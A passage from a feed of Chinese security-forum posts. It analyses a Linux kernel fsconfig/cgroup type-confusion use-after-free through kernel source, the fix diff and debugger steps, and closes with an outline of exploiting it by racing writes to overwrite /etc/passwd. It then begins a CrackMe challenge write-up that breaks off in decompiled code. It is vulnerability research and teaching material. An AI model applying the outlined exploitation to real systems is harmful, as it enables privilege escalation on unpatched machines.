rgb(255, 255, 182);">fs_parse_result</span> result;<br />    int opt, i;<br /><br />    opt = <span style="color: rgb(255, 255, 182);">fs_parse</span>(fc, cgroup1_fs_parameters, param, &amp;result);<br />    <span style="color: rgb(255, 255, 182);">if</span> (opt == -ENOPARAM) {<br />        <span style="color: rgb(255, 255, 182);">if</span> (<span style="color: rgb(255, 255, 182);">strcmp</span>(param-&gt;key, <span style="color: rgb(168, 255, 96);">"source"</span>) == <span style="color: rgb(255, 115, 253);">0</span>) {<br />            <span style="color: rgb(255, 255, 182);">if</span> (fc-&gt;source)<br />                <span style="color: rgb(150, 203, 254);">return</span> <span style="color: rgb(255, 255, 182);">invalf</span>(fc, <span style="color: rgb(168, 255, 96);">"Multiple sources not supported"</span>);<br />            fc-&gt;source = param-&gt;string;<br />            param-&gt;string = NULL;<br />            <span style="color: rgb(150, 203, 254);">return</span> <span style="color: rgb(255, 115, 253);">0</span>;<br />        }<br />        <span style="color: rgb(255, 255, 182);">for_each_subsys</span>(ss, i) {<br />            <span style="color: rgb(255, 255, 182);">if</span> (<span style="color: rgb(255, 255, 182);">strcmp</span>(param-&gt;key, ss-&gt;legacy_name))<br />                <span style="color: rgb(150, 203, 254);">continue</span>;<br />            <span style="color: rgb(255, 255, 182);">if</span> (!<span style="color: rgb(255, 255, 182);">cgroup_ssid_enabled</span>(i) || <span style="color: rgb(255, 255, 182);">cgroup1_ssid_disabled</span>(i))<br />                <span style="color: rgb(150, 203, 254);">return</span> <span style="color: rgb(255, 255, 182);">invalfc</span>(fc, <span style="color: rgb(168, 255, 96);">"Disabled controller '%s'"</span>,<br />                               param-&gt;key);<br />            ctx-&gt;subsys_mask |= (<span style="color: rgb(255, 115, 253);">1</span> &lt;&lt; i);<br />            <span style="color: rgb(150, 203, 254);">return</span> <span style="color: rgb(255, 115, 253);">0</span>;<br />        }<br />        <span style="color: rgb(150, 203, 254);">return</span> <span style="color: rgb(255, 255, 182);">invalfc</span>(fc, <span style="color: rgb(168, 255, 96);">"Unknown subsys name '%s'"</span>, param-&gt;key);<br />    }<br />    <span style="color: rgb(255, 255, 182);">if</span> (opt &lt; <span style="color: rgb(255, 115, 253);">0</span>)<br />        <span style="color: rgb(150, 203, 254);">return</span> opt;<br /><br />    <span style="color: rgb(255, 255, 182);">switch</span> (opt) {<br />        case Opt_none:<br />            <span style="color: rgb(124, 124, 124);">/* Explicitly have no subsystems */</span><br />            ctx-&gt;none = <span style="color: rgb(198, 197, 254);">true</span>;<br />            <span style="color: rgb(150, 203, 254);">break</span>;<br />        case Opt_all:<br />            ctx-&gt;all_ss = <span style="color: rgb(198, 197, 254);">true</span>;<br />            <span style="color: rgb(150, 203, 254);">break</span>;<br />        case Opt_noprefix:<br />            ctx-&gt;flags |= CGRP_ROOT_NOPREFIX;<br />            <span style="color: rgb(150, 203, 254);">break</span>;<br />        case Opt_clone_children:<br />            ctx-&gt;cpuset_clone_children = <span style="color: rgb(198, 197, 254);">true</span>;<br />            <span style="color: rgb(150, 203, 254);">break</span>;<br />        case Opt_cpuset_v2_mode:<br />            ctx-&gt;flags |= CGRP_ROOT_CPUSET_V2_MODE;<br />            <span style="color: rgb(150, 203, 254);">break</span>;<br />        case Opt_xattr:<br />            ctx-&gt;flags |= CGRP_ROOT_XATTR;<br />            <span style="color: rgb(150, 203, 254);">break</span>;<br />        case Opt_release_agent:<br />            <span style="color: rgb(124, 124, 124);">/* Specifying two release agents is forbidden */</span><br />            <span style="color: rgb(255, 255, 182);">if</span> (ctx-&gt;release_agent)<br />                <span style="color: rgb(150, 203, 254);">return</span> <span style="color: rgb(255, 255, 182);">invalfc</span>(fc, <span style="color: rgb(168, 255, 96);">"release_agent respecified"</span>);<br />            ctx-&gt;release_agent = param-&gt;string;<br />            param-&gt;string = NULL;<br />            <span style="color: rgb(150, 203, 254);">break</span>;<br />        case Opt_name:<br />            <span style="color: rgb(124, 124, 124);">/* blocked by boot param? */</span><br />            <span style="color: rgb(255, 255, 182);">if</span> (cgroup_no_v1_named)<br />                <span style="color: rgb(150, 203, 254);">return</span> -ENOENT;<br />            <span style="color: rgb(124, 124, 124);">/* Can't specify an empty name */</span><br />            <span style="color: rgb(255, 255, 182);">if</span> (!param-&gt;size)<br />                <span style="color: rgb(150, 203, 254);">return</span> <span style="color: rgb(255, 255, 182);">invalfc</span>(fc, <span style="color: rgb(168, 255, 96);">"Empty name"</span>);<br />            <span style="color: rgb(255, 255, 182);">if</span> (param-&gt;size &gt; MAX_CGROUP_ROOT_NAMELEN - <span style="color: rgb(255, 115, 253);">1</span>)<br />                <span style="color: rgb(150, 203, 254);">return</span> <span style="color: rgb(255, 255, 182);">invalfc</span>(fc, <span style="color: rgb(168, 255, 96);">"Name too long"</span>);<br />            <span style="color: rgb(124, 124, 124);">/* Must match [\w.-]+ */</span><br />            <span style="color: rgb(255, 255, 182);">for</span> (i = <span style="color: rgb(255, 115, 253);">0</span>; i &lt; param-&gt;size; i++) {<br />                <span style="color: rgb(255, 255, 182);">char</span> c = param-&gt;string[i];<br />                <span style="color: rgb(255, 255, 182);">if</span> (<span style="color: rgb(255, 255, 182);">isalnum</span>(c))<br />                    <span style="color: rgb(150, 203, 254);">continue</span>;<br />                <span style="color: rgb(255, 255, 182);">if</span> ((c == <span style="color: rgb(168, 255, 96);">'.'</span>) || (c == <span style="color: rgb(168, 255, 96);">'-'</span>) || (c == <span style="color: rgb(168, 255, 96);">'_'</span>))<br />                    <span style="color: rgb(150, 203, 254);">continue</span>;<br />                <span style="color: rgb(150, 203, 254);">return</span> <span style="color: rgb(255, 255, 182);">invalfc</span>(fc, <span style="color: rgb(168, 255, 96);">"Invalid name"</span>);<br />            }<br />            <span style="color: rgb(124, 124, 124);">/* Specifying two names is forbidden */</span><br />            <span style="color: rgb(255, 255, 182);">if</span> (ctx-&gt;name)<br />                <span style="color: rgb(150, 203, 254);">return</span> <span style="color: rgb(255, 255, 182);">invalfc</span>(fc, <span style="color: rgb(168, 255, 96);">"name respecified"</span>);<br />            ctx-&gt;name = param-&gt;string;<br />            param-&gt;string = NULL;<br />            <span style="color: rgb(150, 203, 254);">break</span>;<br />    }<br />    <span style="color: rgb(150, 203, 254);">return</span> <span style="color: rgb(255, 115, 253);">0</span>;<br />}</code></pre><p>通过 <code style="font-family: SFMono-Regular, Consolas, ;">PATCH</code> 文件可以看出来（实则因为菜实在分析不来）</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;">diff --git a/kernel/cgroup/cgroup-v1.c b/kernel/cgroup/cgroup-v1.c<br />index ee93b6e895874..527917c0b30be 100644<br />--- a/kernel/cgroup/cgroup-v1.c<br />+++ b/kernel/cgroup/cgroup-v1.c<br />@@ -912,6 +912,8 @@ int cgroup1_parse_param(struct fs_context *fc, struct fs_parameter *param)<br />         opt = fs_parse(fc, cgroup1_fs_parameters, param, &amp;result);<br />         <span style="color: rgb(150, 203, 254);">if</span> (opt == -ENOPARAM) {<br />                 <span style="color: rgb(150, 203, 254);">if</span> (strcmp(param-&gt;key, <span style="color: rgb(168, 255, 96);">"source"</span>) == 0) {<br />+                        <span style="color: rgb(150, 203, 254);">if</span> (param-&gt;type != fs_value_is_string)<br />+                                return invalf(fc, <span style="color: rgb(168, 255, 96);">"Non-string source"</span>);<br />                         <span style="color: rgb(150, 203, 254);">if</span> (fc-&gt;source)<br />                                 return invalf(fc, <span style="color: rgb(168, 255, 96);">"Multiple sources not supported"</span>);<br />                         fc-&gt;source = param-&gt;string;</code></pre><p>如果 <code style="font-family: SFMono-Regular, Consolas, ;">key</code> 为 <code style="font-family: SFMono-Regular, Consolas, ;">source</code>，那么 <code style="font-family: SFMono-Regular, Consolas, ;">param-&gt;type</code> 必须被指定为 <code style="font-family: SFMono-Regular, Consolas, ;">string</code> 类型而不能是文件描述符，此时因为外面的 <code style="font-family: SFMono-Regular, Consolas, ;">cmd=FSCONFIG_SET_FD</code>，因此获取了文件结构在联合体当中。</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(150, 203, 254);">struct</span> <span style="color: rgb(255, 255, 182);">fs_parameter</span> {<br />    <span style="color: rgb(255, 255, 182);">const</span> <span style="color: rgb(255, 255, 182);">char</span>                *key;                <span style="color: rgb(124, 124, 124);">/* Parameter name */</span><br />    <span style="color: rgb(150, 203, 254);">enum</span> <span style="color: rgb(255, 255, 182);">fs_value_type</span>        type:<span style="color: rgb(255, 115, 253);">8</span>;                <span style="color: rgb(124, 124, 124);">/* The type of value here */</span><br />    <span style="color: rgb(150, 203, 254);">union</span> {<br />        <span style="color: rgb(255, 255, 182);">char</span>                *string;<br />        <span style="color: rgb(255, 255, 182);">void</span>                *blob;<br />        <span style="color: rgb(150, 203, 254);">struct</span> <span style="color: rgb(255, 255, 182);">filename</span>        *name;<br />        <span style="color: rgb(150, 203, 254);">struct</span> <span style="color: rgb(255, 255, 182);">file</span>        *file;<br />    };<br />    <span style="color: rgb(255, 255, 182);">size_t</span>        size;<br />    <span style="color: rgb(255, 255, 182);">int</span>        dirfd;<br />};</code></pre><p>在判断中可以看到这样一句：</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(150, 203, 254);">if</span> (strcmp(param-&gt;key, <span style="color: rgb(168, 255, 96);">"source"</span>) == 0) {<br />    <span style="color: rgb(150, 203, 254);">if</span> (fc-&gt;source)<br />        return invalf(fc, <span style="color: rgb(168, 255, 96);">"Multiple sources not supported"</span>);<br />    fc-&gt;source = param-&gt;string;<br />    param-&gt;string = NULL;<br />    return 0;<br />}</code></pre><p>此时将 <code style="font-family: SFMono-Regular, Consolas, ;">string</code> 保存在 <code style="font-family: SFMono-Regular, Consolas, ;">fc-&gt;source</code> 当中，因为它们共用内存，所以这里的 <code style="font-family: SFMono-Regular, Consolas, ;">string</code> 实际上是 <code style="font-family: SFMono-Regular, Consolas, ;">struct file</code> 结构体指针。</p><p>最后要 <code style="font-family: SFMono-Regular, Consolas, ;">free</code> 掉这个 <code style="font-family: SFMono-Regular, Consolas, ;">fs_context</code> 结构时，就意外地造成了这里的文件结构的 <code style="font-family: SFMono-Regular, Consolas, ;">uaf</code>，最后这个系统调用完成会触发 <code style="font-family: SFMono-Regular, Consolas, ;">fscontext_release</code>。</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;">void <span style="color: rgb(255, 255, 182);">put_fs_context</span>(<span style="color: rgb(150, 203, 254);">struct</span> <span style="color: rgb(255, 255, 182);">fs_context</span> *fc)<br />{<br />    <span style="color: rgb(150, 203, 254);">struct</span> <span style="color: rgb(255, 255, 182);">super_block</span> *sb;<br /><br />    <span style="color: rgb(255, 255, 182);">if</span> (fc-&gt;root) {<br />        sb = fc-&gt;root-&gt;d_sb;<br />        <span style="color: rgb(255, 255, 182);">dput</span>(fc-&gt;root);<br />        fc-&gt;root = NULL;<br />        <span style="color: rgb(255, 255, 182);">deactivate_super</span>(sb);<br />    }<br /><br />    <span style="color: rgb(255, 255, 182);">if</span> (fc-&gt;need_free &amp;&amp; fc-&gt;ops &amp;&amp; fc-&gt;ops-&gt;free)<br />        fc-&gt;ops-&gt;<span style="color: rgb(255, 255, 182);">free</span>(fc);<br /><br />    <span style="color: rgb(255, 255, 182);">security_free_mnt_opts</span>(&amp;fc-&gt;security);<br />    <span style="color: rgb(255, 255, 182);">put_net</span>(fc-&gt;net_ns);<br />    <span style="color: rgb(255, 255, 182);">put_user_ns</span>(fc-&gt;user_ns);<br />    <span style="color: rgb(255, 255, 182);">put_cred</span>(fc-&gt;cred);<br />    <span style="color: rgb(255, 255, 182);">put_fc_log</span>(fc);<br />    <span style="color: rgb(255, 255, 182);">put_filesystem</span>(fc-&gt;fs_type);<br />    <span style="color: rgb(255, 255, 182);">kfree</span>(fc-&gt;source);<span style="color: rgb(124, 124, 124);">//这里意外地 free 掉了文件结构</span><br />    <span style="color: rgb(255, 255, 182);">kfree</span>(fc);<br />}<br /><span style="color: rgb(150, 203, 254);">static</span> int <span style="color: rgb(255, 255, 182);">fscontext_release</span>(<span style="color: rgb(150, 203, 254);">struct</span> <span style="color: rgb(255, 255, 182);">inode</span> *inode, <span style="color: rgb(150, 203, 254);">struct</span> <span style="color: rgb(255, 255, 182);">file</span> *file)<br />{<br />    <span style="color: rgb(150, 203, 254);">struct</span> <span style="color: rgb(255, 255, 182);">fs_context</span> *fc = file-&gt;private_data;<br /><br />    <span style="color: rgb(255, 255, 182);">if</span> (fc) {<br />        file-&gt;private_data = NULL;<br />        <span style="color: rgb(255, 255, 182);">put_fs_context</span>(fc);<br />    }<br />    <span style="color: rgb(150, 203, 254);">return</span> <span style="color: rgb(255, 115, 253);">0</span>;<br />}</code></pre><h2>代码调试</h2><h3>触发UAF</h3><p>第一步打断点 <code style="font-family: SFMono-Regular, Consolas, ;">__do_sys_fsconfig</code>，然后跟到图示这个位置，可以发现获取到了文件结构了。</p><p><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=deea24d0&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZI9GVhDhnaGIMS9q4sRhAOKia3kia1AqibC0n941g0TxLbWwB8m29hBJbErm28IoVicoN7JpmRiaYAGabw%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><p>随后跟到这个位置</p><p><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=9966c07d&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZI9GVhDhnaGIMS9q4sRhAOKh4yYO8Ky47C1tHFAFc2WxsPtZpEGyWtN4Eoib3ZFfNt2e9vUSnKadZQ%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><p>这里会有调用刚刚的 <code style="font-family: SFMono-Regular, Consolas, ;">cgroup1_parse_param</code>，当然也可以直接下断点 <code style="font-family: SFMono-Regular, Consolas, ;">continue</code> 过去。</p><p><img border="0" class="rich_pages wxw-img" src="https://https://wechat2rss.xlab.app/img-proxy/?k=e1d8e618&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZI9GVhDhnaGIMS9q4sRhAOK9aCaSuFIZrs6DtFFghVnIDrx8XEsNf5oLVNEqOK16dp3EAKuvfsibmA%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><p>当然这里可以看到 <code style="font-family: SFMono-Regular, Consolas, ;">source</code> 直接被取走了，保存到了 <code style="font-family: SFMono-Regular, Consolas, ;">fc</code> 结构当中。</p><p>随后下断在 <code style="font-family: SFMono-Regular, Consolas, ;">fscontext_release</code>，然后 <code style="font-family: SFMono-Regular, Consolas, ;">continue</code> 过去，走到 <code style="font-family: SFMono-Regular, Consolas, ;">kfree</code> 这和位置可以发现 <code style="font-family: SFMono-Regular, Consolas, ;">source</code> 被释放。</p><p><img border="0" class="rich_pages wxw-img" src="https://https://wechat2rss.xlab.app/img-proxy/?k=a854ffa2&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZI9GVhDhnaGIMS9q4sRhAOK9QGRG15RN0WXar0206ibxKlVXuQCKVYVwXZNDfKK8zF8luwBh4zHxaQ%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><p>这里也能看到作者原意是想在这里释放 <code style="font-family: SFMono-Regular, Consolas, ;">source</code> 字符串，但是这里释放了 <code style="font-family: SFMono-Regular, Consolas, ;">file</code> 文件结构指针，调试的时候可以和之前对一下，发现地址是一致的，因此这里造成了 uaf。</p><h3>延长竞争时间</h3><p>这里采用 <code style="font-family: SFMono-Regular, Consolas, ;">writev</code> 写入大量数据使得文件拿锁的时间加长。为了调试 <code style="font-family: SFMono-Regular, Consolas, ;">exp</code>，可以用 <code style="font-family: SFMono-Regular, Consolas, ;">add-symbol-file</code> 命令去添加符号，这里可以选择断 <code style="font-family: SFMono-Regular, Consolas, ;">write_cmd</code> 的 <code style="font-family: SFMono-Regular, Consolas, ;">writev</code> 函数，因为这里会因为写入数据量过大而长期持有锁，writev 就会尝试持续获得锁。</p><p><img border="0" class="rich_pages wxw-img" src="https://https://wechat2rss.xlab.app/img-proxy/?k=cc34460c&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZI9GVhDhnaGIMS9q4sRhAOKobv3ScTdumMGgVy7s004TcPC57owjahuSb5bG7uY9OQ3tqvBU0FM1w%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><p>随后经过系统调用来到 <code style="font-family: SFMono-Regular, Consolas, ;">do_writev</code> 函数</p><p><img border="0" class="rich_pages wxw-img" src="https://https://wechat2rss.xlab.app/img-proxy/?k=4461bbc7&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZI9GVhDhnaGIMS9q4sRhAOKGhLZqBlbsv8gLBZJTGdp1JrKLApHI4H2c23Md3icIup6P6UoreLbssw%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><p>不过这里多线程比较难调，也不放调试具体过程了，感觉原理还是比较浅显易懂的。</p><h2>总结</h2><p>我们可以总结出以下的利用思路：</p><ul><li style="margin-left: 2px;"><p><code style="font-family: SFMono-Regular, Consolas, ;">fsconfig</code> 系统调用的代码存在类型混淆漏洞，间接导致了可以使得某文件描述符结构被 <code style="font-family: SFMono-Regular, Consolas, ;">uaf</code></p></li><li style="margin-left: 2px;"><p>通过写入大量数据延长竞争时间，通过建立一个链接的方式绕过 <code style="font-family: SFMono-Regular, Consolas, ;">open</code> 时赋予的标记位，使得两个线程可以卡在权限校验之后。</p></li><li style="margin-left: 2px;"><p>第三个线程在第二个线程卡住的时间申请 <code style="font-family: SFMono-Regular, Consolas, ;">/etc/passwd</code> 文件的结构，替换线程 2 正在写入的文件，完成漏洞利用。</p></li></ul><p>分析的还有很多不足之处，如果有讲的不好的地方恳请师傅多多包涵并帮助指正。</p><p style="margin-bottom: 0px; letter-spacing: 0.544px; color: rgb(53, 53, 53); text-align: start; background-color: rgb(255, 255, 255); line-height: 25.6px; font-family: Tahoma, Helvetica, SimSun, sans-serif;"><strong><span style="color: rgb(0, 176, 80);"><strong><span style="color: rgb(255, 255, 255); background-color: rgb(0, 176, 80);">-官方论坛</span></strong></span></strong><br /></p><p style="margin-top: 8px; margin-bottom: 0px; letter-spacing: 0.544px; text-align: start; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><span>www.52pojie.cn</span></p><p style="margin-top: 8px; margin-bottom: 0px; letter-spacing: 0.544px; text-align: start; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><span><br /></span></p><p></p><br /><p style="margin-bottom: 0px; letter-spacing: 0.544px; text-indent: 0em; text-align: center; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><span style="background-color: rgb(255, 251, 0); letter-spacing: normal; font-size: 24px;"><strong><span style="color: rgb(0, 0, 0); font-family: Verdana, Arial, Tahoma; letter-spacing: 5px; text-align: start; background-color: rgb(255, 255, 255);">👆👆👆</span></strong></span><span style="background-color: rgb(255, 251, 0); font-size: 16px; letter-spacing: normal;"><strong><span style="text-align: start; font-family: Arial, sans-serif;"><span style="color: rgb(0, 0, 0); font-family: Verdana, Arial, Tahoma; font-size: 20px; letter-spacing: 5px; background-color: rgb(255, 255, 255);"></span><strong style="font-family: Tahoma, Helvetica, SimSun, sans-serif; letter-spacing: 0.544px;"></strong></span></strong></span></p><p><span style="letter-spacing: normal;"><span style="font-size: 16px;">公众号<span style="color: rgb(255, 0, 0);"><strong>设置“星标”，</strong></span>您</span><span style="font-size: 16px; color: rgb(255, 0, 0);"><strong>不会错过</strong></span><span style="font-size: 16px;">新的消息通知<span style="color: rgb(247, 49, 49); font-family: Arial, sans-serif; font-size: 13px; text-align: start;"></span></span></span></p><br /><p><span style="letter-spacing: normal;"><span style="font-size: 16px;">如</span><strong style="font-size: 16px; letter-spacing: 0.544px;"><span style="color: rgb(255, 0, 0);">开放注册、精华文章和周边活动</span></strong><span style="font-size: 16px;">等公告</span></span></p><br /><p><span style="letter-spacing: normal;"><span style="font-size: 16px;"><br /></span></span></p><br /><p style="margin-bottom: 0px; letter-spacing: 0.544px; text-indent: 0em; text-align: center; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><img class="rich_pages wxw-img" /></p><p style="display: none;"></p>



<p><a href="https://www.52pojie.cn/thread-1900181-1-1.html">阅读原文</a></p>
]]></content:encoded>
<pubDate>Fri, 15 Mar 2024 17:27:50 +0800</pubDate>
<pubDate>Fri, 15 Mar 2024 17:27:50 +0800</pubDate>
</item>
<item>
<title>吾爱破解2024红包题部分WriteUP</title>
<link>https://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651140291&amp;idx=1&amp;sn=4bb26af6072119b8e0757b8aece7ddec&amp;chksm=bd50a0978a272981aa38bdeb24ded75053a2fa778362ee986b6c8dcade3091baaae0e0072437&amp;scene=58&amp;subscene=0</link>
<guid>https://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651140291&amp;idx=1&amp;sn=4bb26af6072119b8e0757b8aece7ddec&amp;chksm=bd50a0978a272981aa38bdeb24ded75053a2fa778362ee986b6c8dcade3091baaae0e0072437&amp;scene=58&amp;subscene=0</guid>
<content:encoded><![CDATA[

<p>
原创 <span>吾爱pojie</span> <span>2024-03-15 17:27</span> <span style="display: inline-block;">北京</span>
</p>

<p>第一年参加红包题目，其中有些操作可能不是那么熟练，感谢各位大佬批评指正，嗯。</p>


<p style="margin-bottom: 0px; letter-spacing: 0.578px; text-align: center; margin-left: 8px; margin-right: 8px;">
<img src="https://https://wechat2rss.xlab.app/img-proxy/?k=113a833c&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_jpg%2FLFPriaSjBUZI9GVhDhnaGIMS9q4sRhAOKwrgfRiavtyhct69I5mJLXfZAvKU7ENmNYzPWyVFYhhWjhIgKdPrdP5w%2F0%3Fwx_fmt%3Djpeg" />
</p>

<p style="margin-bottom: 0px; margin-top: 0px;"><span style="font-size: 24px;"><strong style="letter-spacing: 0.544px; background-color: rgb(255, 255, 255); text-align: start; font-size: 20px;"><span style="font-size: 24px;">作者</span></strong><strong style="letter-spacing: 0.544px; background-color: rgb(255, 255, 255); text-align: start; font-size: 20px;"><span style="font-size: 24px;">论</span></strong><strong style="letter-spacing: 0.544px; background-color: rgb(255, 255, 255); text-align: start; font-size: 20px;"><span style="font-size: 24px;">坛账号：</span>cattie</strong></span></p><p style="margin-bottom: 0px; margin-top: 0px;"><br /></p><h2>前言</h2><p><span style="font-weight: 700;">第一年参加红包题目，其中有些操作可能不是那么熟练，感谢各位大佬批评指正，嗯。</span><br />（后面的高级题太菜了不会做）</p><h2>解题领红包之二 {Windows 初级题}</h2><p><span style="font-weight: 700;">新手题：送分题完成啦来试试新手题吧，点击下方“立即申请”任务，即可获得本题Windows CrackMe题目下载地址，通过分析CrackMe获得本题正确口令的解题方法。</span></p><h3>查壳</h3><p>嗯，很好，没有壳，直接分析。<br /><img border="0" class="rich_pages wxw-img" src="https://https://wechat2rss.xlab.app/img-proxy/?k=bfb1a683&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZI9GVhDhnaGIMS9q4sRhAOKpicRfnm0xLThPRCgqylCWC4n3Nic8vMdmJvTmwHjhPWutg39lqVMjQNQ%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><h3>IDA静态分析</h3><p>（这是什么鬼啊，撤了撤了）<br /><span style="font-weight: 700;">后来发现<code style="font-family: Consolas, Monaco, ;">ioCj~KCss|bQ6zbhCu$5r57$Iljkwlqj$$$?</code>这一串东西是凯撒密码加密过的密文，偏移量为3，但字典是自定义的，懒得跟踪了，直接用OD了</span></p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(255, 255, 182);">int</span> __cdecl <span style="color: rgb(255, 255, 182);">main</span>(<span style="color: rgb(255, 255, 182);">int</span> argc, <span style="color: rgb(255, 255, 182);">const</span> <span style="color: rgb(255, 255, 182);">char</span> **argv, <span style="color: rgb(255, 255, 182);">const</span> <span style="color: rgb(255, 255, 182);">char</span> **envp)<br />{<br />  <span style="color: rgb(255, 255, 182);">int</span> v3; <span style="color: rgb(124, 124, 124);">// eax</span><br />  <span style="color: rgb(255, 255, 182);">unsigned</span> <span style="color: rgb(255, 255, 182);">int</span> v4; <span style="color: rgb(124, 124, 124);">// ebx</span><br />  <span style="color: rgb(255, 255, 182);">void</span> **v5; <span style="color: rgb(124, 124, 124);">// edi</span><br />  <span style="color: rgb(255, 255, 182);">int</span> v6; <span style="color: rgb(124, 124, 124);">// eax</span><br />  <span style="color: rgb(255, 255, 182);">void</span> **v7; <span style="color: rgb(124, 124, 124);">// ecx</span><br />  <span style="color: rgb(255, 255, 182);">void</span> **v8; <span style="color: rgb(124, 124, 124);">// edx</span><br />  <span style="color: rgb(255, 255, 182);">unsigned</span> <span style="color: rgb(255, 255, 182);">int</span> v9; <span style="color: rgb(124, 124, 124);">// esi</span><br />  <span style="color: rgb(255, 255, 182);">bool</span> v10; <span style="color: rgb(124, 124, 124);">// cf</span><br />  <span style="color: rgb(255, 255, 182);">int</span> v11; <span style="color: rgb(124, 124, 124);">// eax</span><br />  <span style="color: rgb(255, 255, 182);">void</span> *v12; <span style="color: rgb(124, 124, 124);">// ecx</span><br />  <span style="color: rgb(255, 255, 182);">void</span> **v13; <span style="color: rgb(124, 124, 124);">// eax</span><br />  <span style="color: rgb(255, 255, 182);">void</span> *v14; <span style="color: rgb(124, 124, 124);">// ecx</span><br />  <span style="color: rgb(255, 255, 182);">void</span> *Src[<span style="color: rgb(255, 115, 253);">5</span>]; <span style="color: rgb(124, 124, 124);">// [esp+14h] [ebp-58h] BYREF</span><br />  <span style="color: rgb(255, 255, 182);">unsigned</span> <span style="color: rgb(255, 255, 182);">int</span> v17; <span style="color: rgb(124, 124, 124);">// [esp+28h] [ebp-44h]</span><br />  <span style="color: rgb(255, 255, 182);">void</span> *Block[<span style="color: rgb(255, 115, 253);">5</span>]; <span style="color: rgb(124, 124, 124);">// [esp+2Ch] [ebp-40h] BYREF</span><br />  <span style="color: rgb(255, 255, 182);">unsigned</span> <span style="color: rgb(255, 255, 182);">int</span> v19; <span style="color: rgb(124, 124, 124);">// [esp+40h] [ebp-2Ch]</span><br />  <span style="color: rgb(255, 255, 182);">void</span> *v20[<span style="color: rgb(255, 115, 253);">4</span>]; <span style="color: rgb(124, 124, 124);">// [esp+44h] [ebp-28h] BYREF</span><br />  <span style="color: rgb(255, 255, 